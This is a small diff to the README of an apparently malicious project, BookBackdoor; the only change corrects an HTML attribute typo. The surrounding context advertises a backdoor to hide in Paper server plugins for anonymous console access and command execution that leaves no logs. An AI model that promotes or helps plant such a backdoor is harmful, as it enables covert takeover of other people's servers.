@@ -4,7 +4,7 @@
   </a>
 </p>
 
-<p allign="center">
+<p align="center">
   <img src="https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg" alt="Build">
   <br>
   Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!
